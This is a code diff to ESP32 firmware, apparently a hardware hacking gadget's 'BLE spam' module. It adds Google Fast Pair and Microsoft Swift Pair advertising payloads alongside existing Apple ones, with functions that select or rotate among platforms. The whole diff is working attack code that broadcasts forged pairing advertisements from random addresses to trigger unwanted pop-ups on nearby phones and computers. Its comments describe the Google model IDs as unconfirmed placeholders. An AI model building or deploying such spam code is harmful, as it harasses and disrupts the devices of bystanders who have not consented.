@@ -108,6 +108,84 @@ static const char *s_device_names[] = {
 };
 
 /* =========================
+ * Per-platform payload sets
+ * =========================
+ * The Apple payloads above carry Apple's company ID (0x004C). The sets below are
+ * built from each vendor's published specification rather than copied from any
+ * third-party implementation.
+ */
+
+/**
+ * Google Fast Pair - "Model ID Data".
+ *
+ * Layout: 06 16 2C FE <model id (24-bit)>
+ *   0x16     Service Data AD type
+ *   0xFE2C   Fast Pair Service UUID (little endian on air)
+ *   model id 24-bit identifier of a Fast Pair capable product
+ *
+ * Trailing bytes are zero padding, which terminates AD parsing cleanly.
+ *
+ * A prompt only appears when the model ID matches a product in the Seeker's
+ * Fast Pair database, and Google has patched Fast Pair prompts on current
+ * Android releases - so expect this to be effective mainly on older, unpatched
+ * builds. The model IDs below are PLACEHOLDERS and are not confirmed working.
+ */
+static const uint8_t s_google_adv_raw[][POOM_BLE_SPAM_ADV_DATA_LEN] = {
+    {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x01},
+    {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x02},
+    {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x03},
+};
+
+static const char *s_google_names[] = {
+    "FASTPAIR 1",
+    "FASTPAIR 2",
+    "FASTPAIR 3",
+};
+
+/**
+ * Microsoft Swift Pair.
+ *
+ * Layout: <len> FF 06 00 03 <scenario> 80 <display name>
+ *   0xFF       Manufacturer Specific Data AD type
+ *   0x0006     Microsoft vendor ID
+ *   0x03       Microsoft Beacon ID for Swift Pair
+ *   scenario   0x00 = LE only, 0x02 = LE + BR/EDR with secure connections,
+ *              0x01 = BR/EDR only using LE for discovery
+ *   0x80       reserved RSSI byte
+ *   name       optional display name, used for the notification text
+ */
+static const uint8_t s_microsoft_adv_raw[][POOM_BLE_SPAM_ADV_DATA_LEN] = {
+    {0x0A, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 'P', 'O', 'O', 'M'},
+    {0x0E, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 'B', 'T', ' ', 'M', 'O', 'U', 'S', 'E'},
+    {0x11, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 'B', 'T', ' ', 'K', 'E', 'Y', 'B', 'O', 'A', 'R', 'D'},
+};
+
+static const char *s_microsoft_names[] = {
+    "SWIFT POOM",
+    "SWIFT MOUSE",
+    "SWIFT KBD",
+};
+
+/**
+ * @brief One selectable family of advertising payloads.
+ */
+typedef struct
+{
+    const uint8_t (*raw)[POOM_BLE_SPAM_ADV_DATA_LEN]; /* Payload table.           */
+    const char **names;                               /* Matching display labels. */
+    size_t count;                                     /* Payloads in this set.    */
+    const char *label;                                /* Short platform label.    */
+} poom_ble_spam_set_t;
+
+static const poom_ble_spam_set_t s_sets[] = {
+    { s_device_adv_raw,    s_device_names,    ARRAY_LEN(s_device_adv_raw),    "APPLE"     },
+    { s_google_adv_raw,    s_google_names,    ARRAY_LEN(s_google_adv_raw),    "FASTPAIR"  },
+    { s_microsoft_adv_raw, s_microsoft_names, ARRAY_LEN(s_microsoft_adv_raw), "SWIFTPAIR" },
+};
+
+#define POOM_BLE_SPAM_SET_COUNT (ARRAY_LEN(s_sets))
+
+/* =========================
  * Local state
  * ========================= */
 static uint32_t s_dwell_ms = POOM_BLE_SPAM_DEFAULT_DWELL_MS;
@@ -168,26 +246,103 @@ static void poom_ble_spam_set_random_addr_for_index_(int idx)
     }
 }
 
+/* =========================
+ * Platform selection
+ * ========================= */
+
+/** Selected platform. `POOM_BLE_SPAM_PLATFORM_ALL` rotates across every set. */
+static poom_ble_spam_platform_t s_platform = POOM_BLE_SPAM_PLATFORM_ALL;
+
+/**
+ * @brief Number of payloads in the current platform selection.
+ *
+ * @return int Payload count, or 0 when nothing is selectable.
+ */
+static int poom_ble_spam_active_count_(void)
+{
+    size_t i;
+    int total = 0;
+
+    if (s_platform < POOM_BLE_SPAM_PLATFORM_ALL)
+    {
+        return (int)s_sets[s_platform].count;
+    }
+
+    for (i = 0; i < POOM_BLE_SPAM_SET_COUNT; i++)
+    {
+        total += (int)s_sets[i].count;
+    }
+
+    return total;
+}
+
+/**
+ * @brief Maps a rotation index onto a concrete payload set and item.
+ *
+ * @param[in]  global_idx Rotation index.
+ * @param[out] set        Receives the owning payload set.
+ * @param[out] item       Receives the index within that set.
+ */
+static void poom_ble_spam_resolve_(int global_idx, const poom_ble_spam_set_t **set, int *item)
+{
+    size_t i;
+    int cursor = global_idx;
+
+    if (s_platform < POOM_BLE_SPAM_PLATFORM_ALL)
+    {
+        *set = &s_sets[s_platform];
+        *item = global_idx;
+        return;
+    }
+
+    for (i = 0; i < POOM_BLE_SPAM_SET_COUNT; i++)
+    {
+        if (cursor < (int)s_sets[i].count)
+        {
+            *set = &s_sets[i];
+            *item = cursor;
+            return;
+        }
+
+        cursor -= (int)s_sets[i].count;
+    }
+
+    *set = &s_sets[0];
+    *item = 0;
+}
+
 /**
  * @brief Selects and configures the next ADV payload.
  */
 static void poom_ble_spam_prepare_next_device_(void)
 {
+    const poom_ble_spam_set_t *set = NULL;
+    int item = 0;
+    int total = poom_ble_spam_active_count_();
+    esp_err_t ret;
+
+    if (total <= 0)
+    {
+        return;
+    }
+
     s_current_device_idx++;
-    if (s_current_device_idx >= (int)ARRAY_LEN(s_device_adv_raw))
+    if (s_current_device_idx >= total)
     {
         s_current_device_idx = 0;
     }
 
+    poom_ble_spam_resolve_(s_current_device_idx, &set, &item);
+
     poom_ble_spam_set_random_addr_for_index_(s_current_device_idx);
 
-    if (s_display_cb != NULL)
+    if ((s_display_cb != NULL) && (set->names != NULL))
     {
-        s_display_cb(s_device_names[s_current_device_idx]);
+        s_display_cb(set->names[item]);
     }
 
-    esp_err_t ret = esp_ble_gap_config_adv_data_raw((uint8_t *)s_device_adv_raw[s_current_device_idx],
-                                                     POOM_BLE_SPAM_ADV_DATA_LEN);
+    ret = esp_ble_gap_config_adv_data_raw((uint8_t *)set->raw[item],
+                                         POOM_BLE_SPAM_ADV_DATA_LEN);
     if (ret != ESP_OK)
     {
         POOM_BLE_SPAM_PRINTF_E("config adv raw failed: %s", esp_err_to_name(ret));
@@ -283,6 +438,70 @@ static void poom_ble_spam_bt_init_stack_(void)
 void poom_ble_spam_register_cb(poom_ble_spam_cb_display callback)
 {
     s_display_cb = callback;
+}
+
+/**
+ * @brief Selects which platform's payloads are advertised.
+ */
+void poom_ble_spam_set_platform(poom_ble_spam_platform_t platform)
+{
+    if (platform >= POOM_BLE_SPAM_PLATFORM_COUNT)
+    {
+        return;
+    }
+
+    if (s_platform != platform)
+    {
+        s_platform = platform;
+        s_current_device_idx = -1;
+    }
+}
+
+/**
+ * @brief Returns the currently selected platform.
+ */
+poom_ble_spam_platform_t poom_ble_spam_get_platform(void)
+{
+    return s_platform;
+}
+
+/**
+ * @brief Returns a short display label for a platform.
+ */
+const char *poom_ble_spam_platform_name(poom_ble_spam_platform_t platform)
+{
+    if (platform < POOM_BLE_SPAM_PLATFORM_ALL)
+    {
+        return s_sets[platform].label;
+    }
+
+    if (platform == POOM_BLE_SPAM_PLATFORM_ALL)
+    {
+        return "ALL";
+    }
+
+    return "?";
+}
+
+/**
+ * @brief Steps the platform selection forwards or backwards.
+ */
+poom_ble_spam_platform_t poom_ble_spam_cycle_platform(int direction)
+{
+    int next = (int)s_platform + ((direction < 0) ? -1 : 1);
+
+    if (next < 0)
+    {
+        next = (int)POOM_BLE_SPAM_PLATFORM_COUNT - 1;
+    }
+    else if (next >= (int)POOM_BLE_SPAM_PLATFORM_COUNT)
+    {
+        next = 0;
+    }
+
+    poom_ble_spam_set_platform((poom_ble_spam_platform_t)next);
+
+    return s_platform;
 }
 
 /**
